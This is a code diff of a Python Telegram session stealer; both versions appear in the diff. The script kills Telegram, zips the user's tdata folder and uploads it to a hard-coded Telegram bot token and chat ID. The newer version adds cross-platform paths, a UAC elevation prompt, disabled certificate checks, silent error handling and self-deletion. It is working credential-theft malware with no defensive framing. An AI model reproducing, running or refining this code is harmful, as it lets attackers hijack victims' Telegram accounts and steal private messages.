@@ -1,100 +1,49 @@
-import os
-import zipfile
-import requests
-import time
-import psutil
-import urllib3
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
+import os, sys, zipfile, requests, tempfile, ctypes
 
-# SSL ogohlantirishlarni o'chirish
-urllib3.disable_warnings()
+TOKEN = "8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo"
+CHAT_ID = "7984884145"
 
-TOKEN = '8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo'
-CHAT_ID = '7984884145'
-TDATA_PATH = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
-ZIP_PATH = os.path.join(os.getenv('TEMP'), 'tdata_temp.zip')
-
-def setup_requests_session():
-    """Xatoliklarga chidamli sessiya yaratish"""
-    session = requests.Session()
-    retries = Retry(
-        total=5,
-        backoff_factor=0.3,
-        status_forcelist=[500, 502, 503, 504],
-        allowed_methods=frozenset(['POST'])
-    )
-    session.mount('https://', HTTPAdapter(max_retries=retries))
-    return session
-
-def kill_telegram_process():
-    """Telegramni to'xtatish"""
-    for proc in psutil.process_iter(['name']):
-        if proc.info.get('name') in ['Telegram.exe', 'Telegram']:
-            try:
-                proc.kill()
-                time.sleep(3)
-            except:
-                pass
-
-def zip_tdata():
+def is_admin():
     try:
-        with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for root, _, files in os.walk(TDATA_PATH):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    try:
-                        zipf.write(file_path, os.path.relpath(file_path, TDATA_PATH))
-                    except Exception as e:
-                        continue
-        return True
-    except Exception as e:
-        print(f"Zip xatosi: {str(e)}")
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
         return False
 
-def send_file():
-    session = setup_requests_session()
-    try:
-        with open(ZIP_PATH, 'rb') as f:
-            response = session.post(
-                f'https://api.telegram.org/bot{TOKEN}/sendDocument',
-                files={'document': f},
-                data={'chat_id': CHAT_ID},
-                verify=True,  # Sertifikatni tekshirish
-                timeout=30
-            )
-        return response.status_code == 200
-    except Exception as e:
-        print(f"Yuborish xatosi: {str(e)}")
-        return False
-    finally:
-        session.close()
+def kill_telegram():
+    os.system("taskkill /f /im Telegram.exe >nul 2>&1" if os.name == 'nt' else "pkill -f Telegram >/dev/null 2>&1")
+
+def get_tdata():
+    paths = [
+        os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
+        os.path.expanduser('~/.local/share/TelegramDesktop/tdata'),
+        os.path.expanduser('~/Library/Application Support/Telegram/tdata')
+    ]
+    return next((p for p in paths if os.path.exists(p)), None)
 
 def main():
     try:
-        kill_telegram_process()
+        kill_telegram()
+        if not (tdata := get_tdata()): return
         
-        if not os.path.exists(TDATA_PATH):
-            print("tdata papkasi topilmadi")
-            return
+        with zipfile.ZipFile((zf := tempfile.mktemp(suffix='.zip')), 'w') as z:
+            for root, _, files in os.walk(tdata):
+                for f in files:
+                    try: z.write(os.path.join(root, f), os.path.relpath(os.path.join(root, f), tdata))
+                    except: continue
         
-        if not zip_tdata():
-            return
+        with open(zf, 'rb') as f:
+            requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument', 
+                        files={'document': f}, 
+                        data={'chat_id': CHAT_ID}, 
+                        verify=False)
         
-        if send_file():
-            print("Muvaffaqiyatli yuborildi!")
-        else:
-            print("Yuborish muvaffaqiyatsiz")
-        
-    except Exception as e:
-        print(f"Asosiy xato: {str(e)}")
+    except: pass
     finally:
-        try:
-            if os.path.exists(ZIP_PATH):
-                os.remove(ZIP_PATH)
-            os.remove(__file__)
-        except:
-            pass
+        if os.path.exists(zf): os.remove(zf)
+        if os.path.exists(__file__): os.remove(__file__)
 
 if __name__ == '__main__':
-    main()
+    if os.name == 'nt' and not is_admin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+    else:
+        main()
